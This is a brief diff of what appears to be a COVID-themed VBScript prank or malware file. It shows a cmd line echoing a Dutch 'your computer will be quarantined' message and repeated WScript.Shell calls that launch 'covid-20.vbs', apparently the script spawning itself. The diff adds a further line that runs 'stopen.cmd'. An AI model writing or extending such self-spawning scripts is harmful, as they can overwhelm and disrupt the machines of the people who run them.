@@ -7,3 +7,4 @@ objshell.run "cmd /c if exist program.cmd (echo je computer zal twee weken in qu
 CreateObject("WScript.Shell").Run "covid-20.vbs"
 CreateObject("WScript.Shell").Run "covid-20.vbs"
 CreateObject("WScript.Shell").Run "covid-20.vbs"
+CreateObject("WScript.Shell").Run "stopen.cmd"
